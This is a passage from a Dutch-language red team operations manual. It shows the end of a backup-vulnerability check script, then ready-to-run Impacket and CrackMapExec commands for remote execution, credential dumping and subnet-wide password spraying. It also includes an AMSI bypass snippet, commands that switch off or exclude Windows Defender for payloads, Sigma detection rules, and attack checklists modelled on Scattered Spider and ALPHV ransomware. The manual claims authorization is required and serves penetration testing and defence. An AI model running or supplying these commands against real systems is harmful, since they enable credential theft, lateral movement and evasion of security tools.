Write-Host ""

# Summary
Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "                        ASSESSMENT SUMMARY                          " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "BACKUP VULNERABILITY STATUS:" -ForegroundColor Yellow

$vulnCount = 0
if ($shadows) { $vulnCount++ }
if ($backupServices) { $vulnCount++ }
if ($shares) { $vulnCount++ }

if ($vulnCount -eq 0) {
    Write-Host "[?] No obvious backup mechanisms found - verify offline backups exist!" -ForegroundColor Yellow
} elseif ($vulnCount -lt 2) {
    Write-Host "[!] MODERATE RISK - Some backups found but may be vulnerable" -ForegroundColor Yellow
} else {
    Write-Host "[!!] HIGH RISK - Multiple accessible backup mechanisms found" -ForegroundColor Red
    Write-Host "     Ransomware could destroy these before encryption!" -ForegroundColor Red
}

Write-Host ""
Write-Host "RECOMMENDATIONS:" -ForegroundColor Cyan
Write-Host "  1. Implement offline/air-gapped backups"
Write-Host "  2. Use immutable backup storage"
Write-Host "  3. Test backup restoration regularly"
Write-Host "  4. Implement 3-2-1-1-0 backup rule"
Write-Host ""
Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "          [ASSESSMENT COMPLETE - NO CHANGES MADE]                  " -ForegroundColor Cyan
Write-Host "═══════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
```

> **📘 UITLEG:**
> Script om backup kwetsbaarheid te assessment.
>
> **Wat wordt gecheckt:**
> - Volume Shadow Copies (instant recovery optie)
> - Backup software services (Veeam, Acronis, etc.)
> - Windows Server Backup catalogus
> - Gemounte network shares (vaak backup locaties)
>
> **ALPHV specifiek:**
> - Stopt backup services VOOR encryption
> - Verwijdert shadow copies
> - Encrypt network shares
> - Maakt recovery onmogelijk zonder betaling
>
> **Red Team deliverable:** Rapport over backup gaps + aanbevelingen.

---

81b54e73b949b CORP/administrator@192.168.1.50
> ```

---

```bash
# WMIExec - WMI-based execution (geen files op disk)
wmiexec.py CORP/administrator:Summer2024!@192.168.1.50
```

> **📘 UITLEG:**
> Executeert commands via Windows Management Instrumentation.
>
> **Voordelen boven PSExec:**
> - Geen files op disk
> - Minder logging
> - Gebruikt standaard Windows protocol

---

```bash
# SMBExec - Service-based execution
smbexec.py CORP/administrator:Summer2024!@192.168.1.50
```

> **📘 UITLEG:**
> Vergelijkbaar met PSExec maar output via SMB shares.
>
> **Verschil:** Iets andere footprint, handig als PSExec geblokkeerd is.

---

```bash
# SecretsDump - Remote credential extraction
secretsdump.py CORP/administrator:Summer2024!@192.168.1.50
```

> **📘 UITLEG:**
> Dumpt credentials van remote machine.
>
> **Wat wordt gedumpt:**
> - SAM database (lokale accounts)
> - LSA secrets
> - Cached domain credentials
> - NTDS.dit (als target is DC)

---

## 9.2 CrackMapExec Lateral Movement

```bash
# Check credentials tegen meerdere hosts
crackmapexec smb 192.168.1.0/24 -u administrator -p 'Summer2024!' --shares
```

> **📘 UITLEG:**
> Test credentials tegen hele subnet en enumerate shares.
>
> **Massale credential validation:** Vind alle machines waar credentials werken.

---

```bash
# Command execution via CME
crackmapexec smb 192.168.1.50 -u administrator -p 'Summer2024!' -x 'whoami'
```

> **📘 UITLEG:**
> Execute command op remote machine.
> - `-x 'command'` = cmd.exe command
> - `-X 'command'` = PowerShell command

---

```bash
# Dump SAM via CME
crackmapexec smb 192.168.1.50 -u administrator -p 'Summer2024!' --sam
```

> **📘 UITLEG:**
> Dump lokale SAM database hashes.
>
> **Credentials reuse:** Lokale admin hashes zijn vaak hetzelfde op meerdere machines.

---

# FASE 10: DEFENSE EVASION

## 10.1 AMSI Bypass

```powershell
# Basic AMSI bypass
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like "*Am*ls"}
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like "*ailed"}
$b.SetValue($null,$true)
```

> **📘 UITLEG:**
> Bypass Antimalware Scan Interface (AMSI).
>
> **Hoe AMSI werkt:**
> 1. PowerShell stuurt scripts naar AMSI
> 2. AMSI scant met Windows Defender
> 3. Malicious = blocked
>
> **Bypass:** Zet `amsiInitFailed` flag op true → AMSI denkt dat het niet geladen is.
>
> **Let op:** Deze specifieke bypass is vaak gedetecteerd - roteer technieken.

---

## 10.2 Windows Defender Evasion

```powershell
# Disable real-time protection (vereist admin)
Set-MpPreference -DisableRealtimeMonitoring $true
```

> **📘 UITLEG:**
> Schakel Windows Defender real-time scanning uit.
>
> **Gevolg:** Malware wordt niet gescand bij execution.
>
> **Detectie:** Dit wordt gelogd in Windows Event Log.

---

```powershell
# Add exclusion path
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

> **📘 UITLEG:**
> Voeg exclusie toe - Defender scant dit pad niet.
>
> **Gebruik:** Plaats payloads in excluded path.
>
> **Stealthier dan disable:** Defender blijft actief maar negeert je payload.

---

# APPENDIX A: TOOL QUICK REFERENCE

| Fase | Tool | Doel |
|------|------|------|
| OSINT | subfinder, amass | Subdomain enumeration |
| OSINT | theHarvester | Email/employee discovery |
| OSINT | Dehashed, IntelX | Credential leak search |
| Scanning | nmap, masscan | Port scanning |
| Scanning | CrackMapExec | SMB enumeration |
| Poisoning | Responder | LLMNR/NBT-NS poisoning |
| Phishing | Evilginx2 | MFA bypass phishing |
| Credentials | Mimikatz, Rubeus | Credential dumping |
| Credentials | hashcat | Password cracking |
| Lateral | Impacket suite | Remote execution |
| Persistence | schtasks, services | Windows persistence |
| Ransomware | Custom simulators | Impact assessment |

---

# APPENDIX B: DETECTION SIGNATURES

```yaml
# Sigma rule: Mimikatz Execution
title: Mimikatz Activity
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4688
        CommandLine|contains:
            - 'sekurlsa'
            - 'lsadump'
            - 'kerberos::'
    condition: selection
level: critical
```

> **📘 UITLEG:**
> Sigma rule voor Mimikatz detectie - geef aan Blue Team.

---

```yaml
# Sigma rule: Shadow Copy Deletion
title: Shadow Copy Deletion (Ransomware Indicator)
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        CommandLine|contains:
            - 'vssadmin delete shadows'
            - 'wmic shadowcopy delete'
    condition: selection
level: critical
```

> **📘 UITLEG:**
> Detectie van shadow copy deletion - vroege ransomware indicator.

---

# APPENDIX C: ATTACK CHAIN CHECKLIST

## Scattered Spider Attack
- [ ] LinkedIn employee enumeration
- [ ] Credential stuffing/spraying
- [ ] Evilginx phishing (Okta/O365)
- [ ] MFA fatigue attack
- [ ] Vishing helpdesk
- [ ] Session cookie hijacking

## ALPHV Ransomware Simulation
- [ ] Domain Admin bereikt
- [ ] Backup systems geïdentificeerd
- [ ] ESXi access getest
- [ ] Shadow copy status gedocumenteerd
- [ ] Impact assessment gegenereerd
- [ ] Recovery capability beoordeeld

---

**EINDE XPOSE ULTIMATE RED TEAM OPERATIONS MANUAL v3.0**

---

*Dit document is strikt vertrouwelijk.*
*Alle technieken vereisen expliciete schriftelijke toestemming.*
*[REDACTED] secties worden behandeld in hands-on training.*

